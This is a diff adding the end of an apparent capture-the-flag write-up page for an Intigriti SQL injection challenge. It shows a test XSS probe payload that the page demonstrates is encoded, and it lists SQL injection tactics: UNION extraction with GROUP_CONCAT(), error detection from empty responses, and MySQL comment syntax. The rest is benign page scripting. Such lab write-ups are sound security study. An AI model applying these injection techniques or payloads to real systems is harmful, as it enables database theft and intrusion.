+  </div>
+
+  <p>The output:</p>
+
+  <div class="code-block reveal">
+    <div class="code-block-header">
+      <div class="dots"><div class="dot r"></div><div class="dot y"></div><div class="dot g"></div></div>
+      <span class="file-label">response</span>
+      <span class="lang-badge">html</span>
+    </div>
+    <pre><code>&lt;div class="desc"&gt;<span class="str">&amp;lt;img src=x onerror=alert(document.domain)&amp;gt;</span>&lt;br&gt;&lt;/div&gt;</code></pre>
+  </div>
+
+  <p>
+    Both the <code>&lt;h2&gt;</code> name and the <code>&lt;div class="desc"&gt;</code> description
+    pass through <code>htmlspecialchars()</code> - all <code>&lt;</code>, <code>&gt;</code>,
+    <code>"</code>, and <code>&amp;</code> are entity-encoded.
+    <strong>There is no XSS here.</strong>
+    The challenge is purely about SQL injection: the flag lives in the database, not in a
+    JavaScript execution context.
+  </p>
+
+  <!-- S9 -->
+  <h2 id="s9"><span class="sh-tag">09 //</span> Key observations</h2>
+
+  <div class="callout callout-green reveal">
+    <strong>The initial tell was behavioural, not syntactic</strong>
+    The case-sensitivity differential between the emoji lookup and the description lookup
+    revealed that two different systems resolve the same input - and a case-insensitive one
+    in a PHP app almost always means a database query with a <code>_ci</code> collation.
+  </div>
+
+  <div class="callout callout-blue reveal">
+    <strong>The zero-byte crash page is the canary</strong>
+    Instead of a 500 or a visible error, the application returns HTTP 200 with an empty body
+    on SQL errors. This is easy to miss if you're only looking at status codes - you need to
+    check <code>Content-Length: 0</code> or the actual response size.
+  </div>
+
+  <div class="callout callout-blue reveal">
+    <strong>Single-column constraint forces GROUP_CONCAT()</strong>
+    The underlying <code>SELECT</code> projects only one column (<code>description</code>),
+    so a <code>UNION</code> can only inject one column. Multi-value extractions need
+    <code>GROUP_CONCAT()</code> to serialise them into a single string.
+  </div>
+
+  <div class="callout callout-yellow reveal">
+    <strong>MySQL comment syntax gotcha</strong>
+    <code>--</code> alone is not a valid comment terminator in MySQL - it needs a trailing space.
+    <code>-- -</code> is the standard workaround (<code>--[space][anything]</code>).
+    Using <code>#</code> also works but can be URL-interpreted; <code>-- -</code> is safer
+    in a URL context.
+  </div>
+
+  <p style="margin-top:40px;padding-top:24px;border-top:1px solid var(--border);font-size:13px;color:var(--text-dim)">
+    Challenge by <a href="https://x.com/khanhdlq" target="_blank" rel="noopener noreferrer">@khanhdlq</a>
+    for <a href="https://www.intigriti.com/" target="_blank" rel="noopener noreferrer">Intigriti</a> - September 2026
+  </p>
+
+</div>
+
+<!-- FOOTER -->
+<footer class="post-footer">
+  <div>written by <span class="accent">iwd</span> - Intigriti September 2026 Challenge - Sep 2026</div>
+  <a href="../" class="back-link">&larr; Back to portfolio</a>
+</footer>
+
+<script>
+// Matrix background
+(function(){
+  const c = document.getElementById('matrix-bg');
+  const ctx = c.getContext('2d');
+  function resize(){ c.width=innerWidth; c.height=innerHeight; }
+  resize();
+  window.addEventListener('resize', resize);
+  const chars = 'アイウエオカキクケコサシスセソタチツテトナニヌネノ0123456789ABCDEF<>/{}[]';
+  const fs = 13;
+  let cols, drops;
+  function init(){ cols=Math.floor(c.width/fs); drops=Array(cols).fill(1); }
+  init();
+  window.addEventListener('resize',()=>{ resize(); init(); });
+  setInterval(()=>{
+    ctx.fillStyle='rgba(10,10,15,0.05)';
+    ctx.fillRect(0,0,c.width,c.height);
+    ctx.fillStyle='#00ff88';
+    ctx.font=fs+'px JetBrains Mono,monospace';
+    drops.forEach((y,i)=>{
+      ctx.fillText(chars[Math.floor(Math.random()*chars.length)], i*fs, y*fs);
+      if(y*fs>c.height && Math.random()>.975) drops[i]=0;
+      drops[i]++;
+    });
+  },50);
+})();
+
+// Navbar scroll
+window.addEventListener('scroll',()=>{
+  document.getElementById('navbar').classList.toggle('scrolled', scrollY>40);
+});
+
+// Reveal on scroll
+const obs = new IntersectionObserver(entries=>{
+  entries.forEach(e=>{ if(e.isIntersecting) e.target.classList.add('visible'); });
+},{threshold:0.1});
+document.querySelectorAll('.reveal').forEach(el=>obs.observe(el));
+</script>
+</body>
+</html>
